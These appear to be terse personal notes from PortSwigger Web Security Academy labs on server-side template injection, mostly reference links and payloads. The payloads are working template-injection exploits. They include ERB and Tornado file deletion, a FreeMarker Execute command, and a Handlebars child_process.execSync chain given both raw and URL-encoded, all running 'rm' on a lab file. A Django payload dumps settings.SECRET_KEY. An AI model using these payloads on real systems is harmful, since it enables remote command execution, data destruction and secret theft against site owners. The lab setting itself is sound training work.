### Basic server-side template injection

first post

https://0ac9005804b8045fc05e1274002b005e.web-security-academy.net/?message=%3C%=%20File.delete(%27/home/carlos/morale.txt%27).read%20%%3E

https://0ac9005804b8045fc05e1274002b005e.web-security-academy.net/?message=%3C%=%20File.delete(%27/home/carlos/morale.txt%27)%20%%3E

https://www.trustedsec.com/blog/rubyerb-template-injection/

### Basic server-side template injection (code context)

change user.name

https://ajinabraham.com/blog/server-side-template-injection-in-tornado

blog-post-author-display=user.name&csrf=ya6XzIkQJ5iZKC6WaOjeQZEJeicgdiDS

blog-post-author-display=user.name}}{{7*7}}&csrf=ya6XzIkQJ5iZKC6WaOjeQZEJeicgdiDS

blog-post-author-display=user.name}}{%import%20os%}{{os.remove(%22/home/carlos/morale.txt%22)}}&csrf=ya6XzIkQJ5iZKC6WaOjeQZEJeicgdiDS

### Server-side template injection using documentation

edit post

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

${product.price} 

${7*7}

${asdasd}

<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }

https://freemarker.apache.org/docs/ref_builtins_expert.html

https://gosecure.github.io/template-injection-workshop/#7

https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf

https://www.synacktiv.com/en/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html

https://ackcent.com/in-depth-freemarker-template-injection/

### Server-side template injection in an unknown language with a documented exploit

first post

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#handlebars---command-execution

http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

https://www.urlencoder.org/

asd%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.push%20%28lookup%20string.sub%20%22constructor%22%29%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.push%20%22return%20require%28%27child_process%27%29.execSync%28%27rm%20%2Fhome%2Fcarlos%2Fmorale.txt%27%29%3B%22%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string.sub.apply%200%20codelist%29%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D

### Server-side template injection with information disclosure via user-supplied objects

${{<%[%'"}}%\

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#django-template

https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf

https://github.com/Lifars/davdts

https://alicecampkin.medium.com/how-to-set-up-environment-variables-in-django-f3c4db78c55f

{% debug %}

{{settings.SECRET_KEY}}

https://docs.djangoproject.com/en/4.1/howto/deployment/checklist/




